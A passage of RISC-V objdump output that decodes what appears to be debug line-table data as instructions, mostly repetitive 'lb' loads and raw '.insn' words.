      58:	08090103          	lb	sp,128(s2)
      5c:	0100                	.insn	2, 0x0100
      5e:	04090203          	lb	tp,64(s2)
      62:	0100                	.insn	2, 0x0100
      64:	04090103          	lb	sp,64(s2)
      68:	0100                	.insn	2, 0x0100
      6a:	04090303          	lb	t1,64(s2)
      6e:	0100                	.insn	2, 0x0100
      70:	04090103          	lb	sp,64(s2)
      74:	0100                	.insn	2, 0x0100
      76:	04090103          	lb	sp,64(s2)
      7a:	0100                	.insn	2, 0x0100
      7c:	04090103          	lb	sp,64(s2)
      80:	0100                	.insn	2, 0x0100
      82:	04090103          	lb	sp,64(s2)
      86:	0100                	.insn	2, 0x0100
      88:	04090103          	lb	sp,64(s2)
      8c:	0100                	.insn	2, 0x0100
      8e:	04090103          	lb	sp,64(s2)
      92:	0100                	.insn	2, 0x0100
      94:	04090103          	lb	sp,64(s2)
      98:	0100                	.insn	2, 0x0100
      9a:	04090103          	lb	sp,64(s2)
      9e:	0100                	.insn	2, 0x0100
      a0:	04090103          	lb	sp,64(s2)
      a4:	0100                	.insn	2, 0x0100
      a6:	04090103          	lb	sp,64(s2)
      aa:	0100                	.insn	2, 0x0100
      ac:	04090103          	lb	sp,64(s2)
      b0:	0100                	.insn	2, 0x0100
      b2:	04090103          	lb	sp,64(s2)
      b6:	0100                	.insn	2, 0x0100
      b8:	04090103          	lb	sp,64(s2)
      bc:	0100                	.insn	2, 0x0100
      be:	04090103          	lb	sp,64(s2)
      c2:	0100                	.insn	2, 0x0100
      c4:	04090103          	lb	sp,64(s2)
      c8:	0100                	.insn	2, 0x0100
      ca:	04090103          	lb	sp,64(s2)
      ce:	0100                	.insn	2, 0x0100
      d0:	04090103          	lb	sp,64(s2)
      d4:	0100                	.insn	2, 0x0100
      d6:	04090103          	lb	sp,64(s2)
      da:	0100                	.insn	2, 0x0100
      dc:	04090103          	lb	sp,64(s2)
      e0:	0100                	.insn	2, 0x0100
      e2:	04090103          	lb	sp,64(s2)
      e6:	0100                	.insn	2, 0x0100
      e8:	04090103          	lb	sp,64(s2)
      ec:	0100                	.insn	2, 0x0100
      ee:	04090103          	lb	sp,64(s2)
      f2:	0100                	.insn	2, 0x0100
      f4:	04090103          	lb	sp,64(s2)
      f8:	0100                	.insn	2, 0x0100
      fa:	04090103          	lb	sp,64(s2)
      fe:	0100                	.insn	2, 0x0100
     100:	04090103          	lb	sp,64(s2)
     104:	0100                	.insn	2, 0x0100
     106:	04090103          	lb	sp,64(s2)
     10a:	0100                	.insn	2, 0x0100
     10c:	04090103          	lb	sp,64(s2)
     110:	0100                	.insn	2, 0x0100
     112:	04090103          	lb	sp,64(s2)
     116:	0100                	.insn	2, 0x0100
     118:	04090103          	lb	sp,64(s2)
     11c:	0100                	.insn	2, 0x0100
     11e:	04090103          	lb	sp,64(s2)
     122:	0100                	.insn	2, 0x0100
     124:	04090103          	lb	sp,64(s2)
     128:	0100                	.insn	2, 0x0100
     12a:	04090203          	lb	tp,64(s2)
     12e:	0100                	.insn	2, 0x0100
     130:	04090603          	lb	a2,64(s2)
     134:	0100                	.insn	2, 0x0100
     136:	04090103          	lb	sp,64(s2)
     13a:	0100                	.insn	2, 0x0100
     13c:	04090103          	lb	sp,64(s2)
     140:	0100                	.insn	2, 0x0100
     142:	04090103          	lb	sp,64(s2)
     146:	0100                	.insn	2, 0x0100
     148:	04090103          	lb	sp,64(s2)
     14c:	0100                	.insn	2, 0x0100
     14e:	04090103          	lb	sp,64(s2)
     152:	0100                	.insn	2, 0x0100
     154:	04090103          	lb	sp,64(s2)
     158:	0100                	.insn	2, 0x0100
     15a:	04090103          	lb	sp,64(s2)
     15e:	0100                	.insn	2, 0x0100
     160:	04090103          	lb	sp,64(s2)
     164:	0100                	.insn	2, 0x0100
     166:	04090103          	lb	sp,64(s2)
     16a:	0100                	.insn	2, 0x0100
     16c:	04090103          	lb	sp,64(s2)
     170:	0100                	.insn	2, 0x0100
     172:	04090103          	lb	sp,64(s2)
     176:	0100                	.insn	2, 0x0100
     178:	04090103          	lb	sp,64(s2)
     17c:	0100                	.insn	2, 0x0100
     17e:	04090103          	lb	sp,64(s2)
     182:	0100                	.insn	2, 0x0100
     184:	04090103          	lb	sp,64(s2)
     188:	0100                	.insn	2, 0x0100
     18a:	04090103          	lb	sp,64(s2)
     18e:	0100                	.insn	2, 0x0100
     190:	04090103          	lb	sp,64(s2)
     194:	0100                	.insn	2, 0x0100
     196:	04090103          	lb	sp,64(s2)
     19a:	0100                	.insn	2, 0x0100
     19c:	04090103          	lb	sp,64(s2)
     1a0:	0100                	.insn	2, 0x0100
     1a2:	04090103          	lb	sp,64(s2)
     1a6:	0100                	.insn	2, 0x0100
     1a8:	04090103          	lb	sp,64(s2)
     1ac:	0100                	.insn	2, 0x0100
     1ae:	04090103          	lb	sp,64(s2)
     1b2:	0100                	.insn	2, 0x0100
     1b4:	04090103          	lb	sp,64(s2)
     1b8:	0100                	.insn	2, 0x0100
     1ba:	04090103          	lb	sp,64(s2)
     1be:	0100                	.insn	2, 0x0100
     1c0:	04090103          	lb	sp,64(s2)
     1c4:	0100                	.insn	2, 0x0100
     1c6:	04090103          	lb	sp,64(s2)
     1ca:	0100                	.insn	2, 0x0100
     1cc:	04090103          	lb	sp,64(s2)
     1d0:	0100                	.insn	2, 0x0100
     1d2:	04090103          	lb	sp,64(s2)
     1d6:	0100                	.insn	2, 0x0100
     1d8:	04090103          	lb	sp,64(s2)
     1dc:	0100                	.insn	2, 0x0100
     1de:	04090103          	lb	sp,64(s2)
     1e2:	0100                	.insn	2, 0x0100
     1e4:	04090103          	lb	sp,64(s2)
     1e8:	0100                	.insn	2, 0x0100
     1ea:	04090103          	lb	sp,64(s2)
     1ee:	0100                	.insn	2, 0x0100
     1f0:	04090103          	lb	sp,64(s2)
     1f4:	0100                	.insn	2, 0x0100
     1f6:	04090303          	lb	t1,64(s2)
     1fa:	0100                	.insn	2, 0x0100
     1fc:	24090203          	lb	tp,576(s2)
     200:	0100                	.insn	2, 0x0100
     202:	24090103          	lb	sp,576(s2)
     206:	0100                	.insn	2, 0x0100
     208:	04090103          	lb	sp,64(s2)
     20c:	0100                	.insn	2, 0x0100
     20e:	58090203          	lb	tp,1408(s2)
     212:	0101                	.insn	2, 0x0101
     214:	24090103          	lb	sp,576(s2)
     218:	0100                	.insn	2, 0x0100
     21a:	04090103          	lb	sp,64(s2)
     21e:	0100                	.insn	2, 0x0100
     220:	58090203          	lb	tp,1408(s2)
     224:	0101                	.insn	2, 0x0101
     226:	24090103          	lb	sp,576(s2)
     22a:	0100                	.insn	2, 0x0100
     22c:	04090103          	lb	sp,64(s2)
     230:	0100                	.insn	2, 0x0100
     232:	58090103          	lb	sp,1408(s2)
     236:	0101                	.insn	2, 0x0101
     238:	24090203          	lb	tp,576(s2)
     23c:	0100                	.insn	2, 0x0100
     23e:	04090103          	lb	sp,64(s2)
     242:	0100                	.insn	2, 0x0100
     244:	04090203          	lb	tp,64(s2)
     248:	0100                	.insn	2, 0x0100
     24a:	04090103          	lb	sp,64(s2)
     24e:	0100                	.insn	2, 0x0100
     250:	58090103          	lb	sp,1408(s2)
     254:	0101                	.insn	2, 0x0101
     256:	24090103          	lb	sp,576(s2)
     25a:	0100                	.insn	2, 0x0100
     25c:	04090103          	lb	sp,64(s2)
     260:	0100                	.insn	2, 0x0100
     262:	04090103          	lb	sp,64(s2)
     266:	0100                	.insn	2, 0x0100
     268:	58090103          	lb	sp,1408(s2)
     26c:	0101                	.insn	2, 0x0101
     26e:	24090103          	lb	sp,576(s2)
     272:	0100                	.insn	2, 0x0100
     274:	04090103          	lb	sp,64(s2)
     278:	0100                	.insn	2, 0x0100
     27a:	04090103          	lb	sp,64(s2)
     27e:	0100                	.insn	2, 0x0100
     280:	24090303          	lb	t1,576(s2)
     284:	0100                	.insn	2, 0x0100
     286:	04090203          	lb	tp,64(s2)
     28a:	0100                	.insn	2, 0x0100
     28c:	04090103          	lb	sp,64(s2)
     290:	0100                	.insn	2, 0x0100
     292:	04090103          	lb	sp,64(s2)
     296:	0100                	.insn	2, 0x0100
     298:	04090103          	lb	sp,64(s2)
     29c:	0100                	.insn	2, 0x0100
     29e:	04090103          	lb	sp,64(s2)
     2a2:	0100                	.insn	2, 0x0100
     2a4:	04090103          	lb	sp,64(s2)
     2a8:	0100                	.insn	2, 0x0100
     2aa:	04090103          	lb	sp,64(s2)
     2ae:	0100                	.insn	2, 0x0100
     2b0:	04090103          	lb	sp,64(s2)
     2b4:	0100                	.insn	2, 0x0100
     2b6:	04090103          	lb	sp,64(s2)
     2ba:	0100                	.insn	2, 0x0100
     2bc:	04090103          	lb	sp,64(s2)
     2c0:	0100                	.insn	2, 0x0100
     2c2:	04090103          	lb	sp,64(s2)
     2c6:	0100                	.insn	2, 0x0100
     2c8:	04090103          	lb	sp,64(s2)
     2cc:	0100                	.insn	2, 0x0100
     2ce:	04090103          	lb	sp,64(s2)
     2d2:	0100                	.insn	2, 0x0100
     2d4:	04090103          	lb	sp,64(s2)
     2d8:	0100                	.insn	2, 0x0100
     2da:	04090103          	lb	sp,64(s2)
     2de:	0100                	.insn	2, 0x0100
     2e0:	04090103          	lb	sp,64(s2)
     2e4:	0100                	.insn	2, 0x0100
     2e6:	04090103          	lb	sp,64(s2)
     2ea:	0100                	.insn	2, 0x0100
     2ec:	04090103          	lb	sp,64(s2)
     2f0:	0100                	.insn	2, 0x0100
     2f2:	04090103          	lb	sp,64(s2)
     2f6:	0100                	.insn	2, 0x0100
     2f8:	04090103          	lb	sp,64(s2)
     2fc:	0100                	.insn	2, 0x0100
     2fe:	04090103          	lb	sp,64(s2)
     302:	0100                	.insn	2, 0x0100
     304:	04090103          	lb	sp,64(s2)
     308:	0100                	.insn	2, 0x0100
     30a:	04090103          	lb	sp,64(s2)
     30e:	0100                	.insn	2, 0x0100
     310:	04090103          	lb	sp,64(s2)
     314:	0100                	.insn	2, 0x0100
     316:	04090103          	lb	sp,64(s2)
     31a:	0100                	.insn	2, 0x0100
     31c:	04090103          	lb	sp,64(s2)
     320:	0100                	.insn	2, 0x0100
     322:	04090103          	lb	sp,64(s2)
     326:	0100                	.insn	2, 0x0100
     328:	04090103          	lb	sp,64(s2)
     32c:	0100                	.insn	2, 0x0100
     32e:	04090103          	lb	sp,64(s2)
     332:	0100                	.insn	2, 0x0100
     334:	04090103          	lb	sp,64(s2)
     338:	0100                	.insn	2, 0x0100
     33a:	04090103          	lb	sp,64(s2)
     33e:	0100                	.insn	2, 0x0100
     340:	04090103          	lb	sp,64(s2)
     344:	0100                	.insn	2, 0x0100
     346:	04090103          	lb	sp,64(s2)
     34a:	0100                	.insn	2, 0x0100
     34c:	04090203          	lb	tp,64(s2)
     350:	0100                	.insn	2, 0x0100
     352:	0409                	.insn	2, 0x0409
     354:	0000                	.insn	2, 0x
     356:	0101                	.insn	2, 0x0101
     358:	016c                	.insn	2, 0x016c
     35a:	0000                	.insn	2, 0x
     35c:	0005                	.insn	2, 0x0005
     35e:	0004                	.insn	2, 0x0004
     360:	003c                	.insn	2, 0x003c
     362:	0000                	.insn	2, 0x
     364:	0101                	.insn	2, 0x0101
     366:	fb01                	.insn	2, 0xfb01
     368:	0d0e                	.insn	2, 0x0d0e
     36a:	0100                	.insn	2, 0x0100
     36c:	0101                	.insn	2, 0x0101
     36e:	0001                	.insn	2, 0x0001
     370:	0000                	.insn	2, 0x
     372:	0001                	.insn	2, 0x0001
     374:	0100                	.insn	2, 0x0100
     376:	0101                	.insn	2, 0x0101
     378:	031f 0000 0000      	.insn	6, 0x031f
     37e:	007f 0000 00ac 0000 	.insn	10, 0x0102000000ac0000007f
     386:	0102 
     388:	021f 040f 0072      	.insn	6, 0x0072040f021f
     38e:	0000                	.insn	2, 0x
     390:	7201                	.insn	2, 0x7201
     392:	0000                	.insn	2, 0x
     394:	0100                	.insn	2, 0x0100
     396:	00e2                	.insn	2, 0x00e2
     398:	0000                	.insn	2, 0x
     39a:	ef02                	.insn	2, 0xef02
     39c:	0000                	.insn	2, 0x
     39e:	0200                	.insn	2, 0x0200
     3a0:	4305                	.insn	2, 0x4305
     3a2:	0500                	.insn	2, 0x0500
     3a4:	bc02                	.insn	2, 0xbc02
     3a6:	0019                	.insn	2, 0x0019
     3a8:	0300                	.insn	2, 0x0300
     3aa:	0e05010b          	.insn	4, 0x0e05010b
     3ae:	18090103          	lb	sp,384(s2)
     3b2:	0100                	.insn	2, 0x0100
     3b4:	1405                	.insn	2, 0x1405
     3b6:	08090103          	lb	sp,128(s2)
     3ba:	0100                	.insn	2, 0x0100
     3bc:	1105                	.insn	2, 0x1105
     3be:	08090203          	lb	tp,128(s2)
     3c2:	0100                	.insn	2, 0x0100
     3c4:	0505                	.insn	2, 0x0505
     3c6:	04090003          	lb	zero,64(s2)
     3ca:	0100                	.insn	2, 0x0100
     3cc:	1605                	.insn	2, 0x1605
     3ce:	04090103          	lb	sp,64(s2)
     3d2:	0100                	.insn	2, 0x0100
     3d4:	0d05                	.insn	2, 0x0d05
     3d6:	0c090003          	lb	zero,192(s2)
     3da:	0100                	.insn	2, 0x0100
     3dc:	1605                	.insn	2, 0x1605
     3de:	0c090003          	lb	zero,192(s2)
     3e2:	0100                	.insn	2, 0x0100
     3e4:	1105                	.insn	2, 0x1105
     3e6:	04090003          	lb	zero,64(s2)
     3ea:	0100                	.insn	2, 0x0100
     3ec:	2005                	.insn	2, 0x2005
     3ee:	0200                	.insn	2, 0x0200
     3f0:	0304                	.insn	2, 0x0304
     3f2:	04097f03          	.insn	4, 0x04097f03
     3f6:	0100                	.insn	2, 0x0100
     3f8:	1a05                	.insn	2, 0x1a05
     3fa:	0200                	.insn	2, 0x0200
     3fc:	0104                	.insn	2, 0x0104
     3fe:	0c090003          	lb	zero,192(s2)
     402:	0100                	.insn	2, 0x0100
     404:	0c05                	.insn	2, 0x0c05
     406:	0c090303          	lb	t1,192(s2)
     40a:	0100                	.insn	2, 0x0100
     40c:	0105                	.insn	2, 0x0105
     40e:	04090103          	lb	sp,64(s2)
     412:	0100                	.insn	2, 0x0100
     414:	3705                	.insn	2, 0x3705
     416:	10090203          	lb	tp,256(s2)
     41a:	0100                	.insn	2, 0x0100
     41c:	0e05                	.insn	2, 0x0e05
     41e:	18090103          	lb	sp,384(s2)
     422:	0100                	.insn	2, 0x0100
     424:	1105                	.insn	2, 0x1105
     426:	08090103          	lb	sp,128(s2)
     42a:	0100                	.insn	2, 0x0100
     42c:	0505                	.insn	2, 0x0505
     42e:	04090003          	lb	zero,64(s2)
     432:	0100                	.insn	2, 0x0100
     434:	0c05                	.insn	2, 0x0c05
     436:	04090103          	lb	sp,64(s2)
     43a:	0100                	.insn	2, 0x0100
     43c:	1205                	.insn	2, 0x1205
     43e:	0c090003          	lb	zero,192(s2)
     442:	0100                	.insn	2, 0x0100
     444:	1005                	.insn	2, 0x1005
     446:	08090003          	lb	zero,128(s2)
     44a:	0100                	.insn	2, 0x0100
     44c:	2005                	.insn	2, 0x2005
     44e:	0200                	.insn	2, 0x0200
     450:	0304                	.insn	2, 0x0304
     452:	04097f03          	.insn	4, 0x04097f03
     456:	0100                	.insn	2, 0x0100
     458:	1a05                	.insn	2, 0x1a05
     45a:	0200                	.insn	2, 0x0200
     45c:	0104                	.insn	2, 0x0104
     45e:	0c090003          	lb	zero,192(s2)
     462:	0100                	.insn	2, 0x0100
     464:	0c05                	.insn	2, 0x0c05
     466:	0c090303          	lb	t1,192(s2)
     46a:	0100                	.insn	2, 0x0100
     46c:	0105                	.insn	2, 0x0105
     46e:	04090103          	lb	sp,64(s2)
     472:	0100                	.insn	2, 0x0100
     474:	0e05                	.insn	2, 0x0e05
     476:	10090203          	lb	tp,256(s2)
     47a:	0100                	.insn	2, 0x0100
     47c:	1805                	.insn	2, 0x1805
     47e:	10090403          	lb	s0,256(s2)
     482:	0100                	.insn	2, 0x0100
     484:	2e05                	.insn	2, 0x2e05
     486:	08090003          	lb	zero,128(s2)
     48a:	0100                	.insn	2, 0x0100
     48c:	0c05                	.insn	2, 0x0c05
     48e:	08090003          	lb	zero,128(s2)
     492:	0100                	.insn	2, 0x0100
     494:	1705                	.insn	2, 0x1705
     496:	08090103          	lb	sp,128(s2)
     49a:	0100                	.insn	2, 0x0100
     49c:	2c05                	.insn	2, 0x2c05
     49e:	08090003          	lb	zero,128(s2)
     4a2:	0100                	.insn	2, 0x0100
     4a4:	0c05                	.insn	2, 0x0c05
     4a6:	08090003          	lb	zero,128(s2)
     4aa:	0100                	.insn	2, 0x0100
     4ac:	0505                	.insn	2, 0x0505
     4ae:	08090103          	lb	sp,128(s2)
     4b2:	0100                	.insn	2, 0x0100
     4b4:	14090103          	lb	sp,320(s2)
     4b8:	0100                	.insn	2, 0x0100
     4ba:	0105                	.insn	2, 0x0105
     4bc:	14090103          	lb	sp,320(s2)
     4c0:	0100                	.insn	2, 0x0100
     4c2:	1409                	.insn	2, 0x1409
     4c4:	0000                	.insn	2, 0x
     4c6:	0101                	.insn	2, 0x0101
     4c8:	00000c43          	fmadd.s	fs8,ft0,ft0,ft0,rne
     4cc:	0005                	.insn	2, 0x0005
     4ce:	0004                	.insn	2, 0x0004
     4d0:	005c                	.insn	2, 0x005c
     4d2:	0000                	.insn	2, 0x
     4d4:	0101                	.insn	2, 0x0101
     4d6:	fb01                	.insn	2, 0xfb01
     4d8:	0d0e                	.insn	2, 0x0d0e
     4da:	0100                	.insn	2, 0x0100
     4dc:	0101                	.insn	2, 0x0101
     4de:	0001                	.insn	2, 0x0001
     4e0:	0000                	.insn	2, 0x
     4e2:	0001                	.insn	2, 0x0001
     4e4:	0100                	.insn	2, 0x0100
     4e6:	0101                	.insn	2, 0x0101
     4e8:	061f 0000 0000      	.insn	6, 0x061f
     4ee:	00ff 0000 0102 0000 	.insn	10, 0x010600000102000000ff
     4f6:	0106 
     4f8:	0000                	.insn	2, 0x
     4fa:	00ac                	.insn	2, 0x00ac
     4fc:	0000                	.insn	2, 0x
     4fe:	0135                	.insn	2, 0x0135
     500:	0000                	.insn	2, 0x
     502:	0102                	.insn	2, 0x0102
     504:	021f 080f 00f8      	.insn	6, 0x00f8080f021f
     50a:	0000                	.insn	2, 0x
     50c:	6000                	.insn	2, 0x6000
     50e:	0001                	.insn	2, 0x0001
     510:	0100                	.insn	2, 0x0100
     512:	0166                	.insn	2, 0x0166
     514:	0000                	.insn	2, 0x
     516:	6e02                	.insn	2, 0x6e02
     518:	0001                	.insn	2, 0x0001
     51a:	0200                	.insn	2, 0x0200
     51c:	00f8                	.insn	2, 0x00f8
     51e:	0000                	.insn	2, 0x
     520:	7700                	.insn	2, 0x7700
     522:	0001                	.insn	2, 0x0001
     524:	0300                	.insn	2, 0x0300
     526:	000000ef          	jal	526 <_start-0xada>
     52a:	8804                	.insn	2, 0x8804
     52c:	0001                	.insn	2, 0x0001
     52e:	0500                	.insn	2, 0x0500
     530:	0105                	.insn	2, 0x0105
     532:	0500                	.insn	2, 0x0500
     534:	2002                	.insn	2, 0x2002
     536:	0300001b          	.insn	4, 0x0300001b
     53a:	0905010b          	.insn	4, 0x0905010b
     53e:	18090103          	lb	sp,384(s2)
     542:	0100                	.insn	2, 0x0100
     544:	0f05                	.insn	2, 0x0f05
     546:	08090103          	lb	sp,128(s2)
     54a:	0100                	.insn	2, 0x0100
     54c:	08090103          	lb	sp,128(s2)
     550:	0100                	.insn	2, 0x0100
     552:	0305                	.insn	2, 0x0305
     554:	04090003          	lb	zero,64(s2)
     558:	0100                	.insn	2, 0x0100
     55a:	2f05                	.insn	2, 0x2f05
     55c:	0200                	.insn	2, 0x0200
     55e:	0304                	.insn	2, 0x0304
     560:	04090003          	lb	zero,64(s2)
     564:	0100                	.insn	2, 0x0100
     566:	2605                	.insn	2, 0x2605
     568:	0200                	.insn	2, 0x0200
     56a:	0304                	.insn	2, 0x0304
     56c:	0c090003          	lb	zero,192(s2)
     570:	0100                	.insn	2, 0x0100
     572:	2f05                	.insn	2, 0x2f05
     574:	0200                	.insn	2, 0x0200
     576:	0304                	.insn	2, 0x0304
     578:	0c090003          	lb	zero,192(s2)
     57c:	0100                	.insn	2, 0x0100
     57e:	2a05                	.insn	2, 0x2a05
     580:	0200                	.insn	2, 0x0200
     582:	0304                	.insn	2, 0x0304
     584:	04090003          	lb	zero,64(s2)
     588:	0100                	.insn	2, 0x0100
     58a:	1e05                	.insn	2, 0x1e05
     58c:	0200                	.insn	2, 0x0200
     58e:	0304                	.insn	2, 0x0304
     590:	04090003          	lb	zero,64(s2)
     594:	0100                	.insn	2, 0x0100
     596:	1805                	.insn	2, 0x1805
     598:	0200                	.insn	2, 0x0200
     59a:	0104                	.insn	2, 0x0104
     59c:	0c090003          	lb	zero,192(s2)
     5a0:	0100                	.insn	2, 0x0100
     5a2:	0a05                	.insn	2, 0x0a05
     5a4:	0c090103          	lb	sp,192(s2)
     5a8:	0100                	.insn	2, 0x0100
     5aa:	0105                	.insn	2, 0x0105
     5ac:	04090103          	lb	sp,64(s2)
     5b0:	0100                	.insn	2, 0x0100
     5b2:	10090303          	lb	t1,256(s2)
     5b6:	0100                	.insn	2, 0x0100
     5b8:	0c090603          	lb	a2,192(s2)
     5bc:	0100                	.insn	2, 0x0100
     5be:	10090303          	lb	t1,256(s2)
     5c2:	0100                	.insn	2, 0x0100
     5c4:	1305                	.insn	2, 0x1305
     5c6:	14090103          	lb	sp,320(s2)
     5ca:	0100                	.insn	2, 0x0100
     5cc:	0905                	.insn	2, 0x0905
     5ce:	08090403          	lb	s0,128(s2)
     5d2:	0100                	.insn	2, 0x0100
     5d4:	04090103          	lb	sp,64(s2)
     5d8:	0100                	.insn	2, 0x0100
     5da:	0805                	.insn	2, 0x0805
     5dc:	04090203          	lb	tp,64(s2)
     5e0:	0100                	.insn	2, 0x0100
     5e2:	1405                	.insn	2, 0x1405
     5e4:	08090203          	lb	tp,128(s2)
     5e8:	0100                	.insn	2, 0x0100
     5ea:	0d05                	.insn	2, 0x0d05
     5ec:	08090203          	lb	tp,128(s2)
     5f0:	0100                	.insn	2, 0x0100
     5f2:	1705                	.insn	2, 0x1705
     5f4:	0c090403          	lb	s0,192(s2)
     5f8:	0100                	.insn	2, 0x0100
     5fa:	1d05                	.insn	2, 0x1d05
     5fc:	0c090003          	lb	zero,192(s2)
     600:	0100                	.insn	2, 0x0100
     602:	1005                	.insn	2, 0x1005
     604:	04090003          	lb	zero,64(s2)
     608:	0100                	.insn	2, 0x0100
     60a:	0c05                	.insn	2, 0x0c05
     60c:	14090103          	lb	sp,320(s2)
     610:	0100                	.insn	2, 0x0100
     612:	0d05                	.insn	2, 0x0d05
     614:	0c090103          	lb	sp,192(s2)
     618:	0100                	.insn	2, 0x0100
     61a:	1205                	.insn	2, 0x1205
     61c:	0200                	.insn	2, 0x0200
     61e:	0104                	.insn	2, 0x0104
     620:	10090103          	lb	sp,256(s2)
     624:	0100                	.insn	2, 0x0100
     626:	0805                	.insn	2, 0x0805
     628:	08090203          	lb	tp,128(s2)
     62c:	0100                	.insn	2, 0x0100
     62e:	1005                	.insn	2, 0x1005
     630:	08090103          	lb	sp,128(s2)
     634:	0100                	.insn	2, 0x0100
     636:	0c05                	.insn	2, 0x0c05
     638:	18090103          	lb	sp,384(s2)
     63c:	0100                	.insn	2, 0x0100
     63e:	0c090303          	lb	t1,192(s2)
     642:	0100                	.insn	2, 0x0100
     644:	0505                	.insn	2, 0x0505
     646:	0c090003          	lb	zero,192(s2)
     64a:	0100                	.insn	2, 0x0100
     64c:	0905                	.insn	2, 0x0905
     64e:	04090103          	lb	sp,64(s2)
     652:	0100                	.insn	2, 0x0100
     654:	2205                	.insn	2, 0x2205
     656:	0200                	.insn	2, 0x0200
     658:	0104                	.insn	2, 0x0104
     65a:	04090003          	lb	zero,64(s2)
     65e:	0100                	.insn	2, 0x0100
     660:	1f05                	.insn	2, 0x1f05
     662:	0200                	.insn	2, 0x0200
     664:	0104                	.insn	2, 0x0104
     666:	14090003          	lb	zero,320(s2)
     66a:	0100                	.insn	2, 0x0100
     66c:	2005                	.insn	2, 0x2005
     66e:	0200                	.insn	2, 0x0200
     670:	0304                	.insn	2, 0x0304
     672:	08097f03          	.insn	4, 0x08097f03
     676:	0100                	.insn	2, 0x0100
     678:	1905                	.insn	2, 0x1905
     67a:	0200                	.insn	2, 0x0200
     67c:	0104                	.insn	2, 0x0104
     67e:	0c090003          	lb	zero,192(s2)
     682:	0100                	.insn	2, 0x0100
     684:	0105                	.insn	2, 0x0105
     686:	08090303          	lb	t1,128(s2)
     68a:	0100                	.insn	2, 0x0100
     68c:	18090303          	lb	t1,384(s2)
     690:	0100                	.insn	2, 0x0100
     692:	1305                	.insn	2, 0x1305
     694:	14090103          	lb	sp,320(s2)
     698:	0100                	.insn	2, 0x0100
     69a:	0905                	.insn	2, 0x0905
     69c:	08090403          	lb	s0,128(s2)
     6a0:	0100                	.insn	2, 0x0100
     6a2:	0b05                	.insn	2, 0x0b05
     6a4:	04090203          	lb	tp,64(s2)
     6a8:	0100                	.insn	2, 0x0100
     6aa:	1805                	.insn	2, 0x1805
     6ac:	04090103          	lb	sp,64(s2)
     6b0:	0100                	.insn	2, 0x0100
     6b2:	3305                	.insn	2, 0x3305
     6b4:	08090003          	lb	zero,128(s2)
     6b8:	0100                	.insn	2, 0x0100
     6ba:	1805                	.insn	2, 0x1805
     6bc:	04090103          	lb	sp,64(s2)
     6c0:	0100                	.insn	2, 0x0100
     6c2:	3305                	.insn	2, 0x3305
     6c4:	08090003          	lb	zero,128(s2)
     6c8:	0100                	.insn	2, 0x0100
     6ca:	1805                	.insn	2, 0x1805
     6cc:	08090103          	lb	sp,128(s2)
     6d0:	0100                	.insn	2, 0x0100
     6d2:	3305                	.insn	2, 0x3305
     6d4:	08090003          	lb	zero,128(s2)
     6d8:	0100                	.insn	2, 0x0100
     6da:	1805                	.insn	2, 0x1805
     6dc:	08090103          	lb	sp,128(s2)
     6e0:	0100                	.insn	2, 0x0100
     6e2:	3305                	.insn	2, 0x3305
     6e4:	08090003          	lb	zero,128(s2)
     6e8:	0100                	.insn	2, 0x0100
     6ea:	1805                	.insn	2, 0x1805
     6ec:	08090103          	lb	sp,128(s2)
     6f0:	0100                	.insn	2, 0x0100
     6f2:	3305                	.insn	2, 0x3305
     6f4:	08090003          	lb	zero,128(s2)
     6f8:	0100                	.insn	2, 0x0100
     6fa:	1805                	.insn	2, 0x1805
     6fc:	08090103          	lb	sp,128(s2)
     700:	0100                	.insn	2, 0x0100
     702:	3305                	.insn	2, 0x3305
     704:	08090003          	lb	zero,128(s2)
     708:	0100                	.insn	2, 0x0100
     70a:	1805                	.insn	2, 0x1805
     70c:	08090103          	lb	sp,128(s2)
     710:	0100                	.insn	2, 0x0100
     712:	3305                	.insn	2, 0x3305
     714:	08090003          	lb	zero,128(s2)
     718:	0100                	.insn	2, 0x0100
     71a:	1805                	.insn	2, 0x1805
     71c:	08090103          	lb	sp,128(s2)
     720:	0100                	.insn	2, 0x0100
     722:	3305                	.insn	2, 0x3305
     724:	08090003          	lb	zero,128(s2)
     728:	0100                	.insn	2, 0x0100
     72a:	1805                	.insn	2, 0x1805
     72c:	08090103          	lb	sp,128(s2)
     730:	0100                	.insn	2, 0x0100
     732:	3305                	.insn	2, 0x3305
     734:	08090003          	lb	zero,128(s2)
     738:	0100                	.insn	2, 0x0100
     73a:	1805                	.insn	2, 0x1805
     73c:	08090103          	lb	sp,128(s2)
     740:	0100                	.insn	2, 0x0100
     742:	3305                	.insn	2, 0x3305
     744:	08090003          	lb	zero,128(s2)
     748:	0100                	.insn	2, 0x0100
     74a:	1805                	.insn	2, 0x1805
     74c:	08090103          	lb	sp,128(s2)
     750:	0100                	.insn	2, 0x0100
     752:	3305                	.insn	2, 0x3305
     754:	08090003          	lb	zero,128(s2)
     758:	0100                	.insn	2, 0x0100
     75a:	1805                	.insn	2, 0x1805
     75c:	08090103          	lb	sp,128(s2)
     760:	0100                	.insn	2, 0x0100
     762:	3305                	.insn	2, 0x3305
     764:	08090003          	lb	zero,128(s2)
     768:	0100                	.insn	2, 0x0100
     76a:	1805                	.insn	2, 0x1805
     76c:	08090103          	lb	sp,128(s2)
     770:	0100                	.insn	2, 0x0100
     772:	3305                	.insn	2, 0x3305
     774:	08090003          	lb	zero,128(s2)
     778:	0100                	.insn	2, 0x0100
     77a:	1805                	.insn	2, 0x1805
     77c:	08090103          	lb	sp,128(s2)
     780:	0100                	.insn	2, 0x0100
     782:	3305                	.insn	2, 0x3305
     784:	08090003          	lb	zero,128(s2)
     788:	0100                	.insn	2, 0x0100
     78a:	1805                	.insn	2, 0x1805
     78c:	08090103          	lb	sp,128(s2)
     790:	0100                	.insn	2, 0x0100
     792:	3305                	.insn	2, 0x3305
     794:	08090003          	lb	zero,128(s2)
     798:	0100                	.insn	2, 0x0100
     79a:	0200                	.insn	2, 0x0200
     79c:	0104                	.insn	2, 0x0104
     79e:	0306                	.insn	2, 0x0306
     7a0:	0900                	.insn	2, 0x0900
     7a2:	0008                	.insn	2, 0x0008
     7a4:	0001                	.insn	2, 0x0001
     7a6:	0402                	.insn	2, 0x0402
     7a8:	0302                	.insn	2, 0x0302
     7aa:	0900                	.insn	2, 0x0900
     7ac:	0008                	.insn	2, 0x0008
     7ae:	0001                	.insn	2, 0x0001
     7b0:	0402                	.insn	2, 0x0402
     7b2:	0601                	.insn	2, 0x0601
     7b4:	08097f03          	.insn	4, 0x08097f03
     7b8:	0100                	.insn	2, 0x0100
     7ba:	0200                	.insn	2, 0x0200
     7bc:	0104                	.insn	2, 0x0104
     7be:	08097f03          	.insn	4, 0x08097f03
     7c2:	0100                	.insn	2, 0x0100
     7c4:	0200                	.insn	2, 0x0200
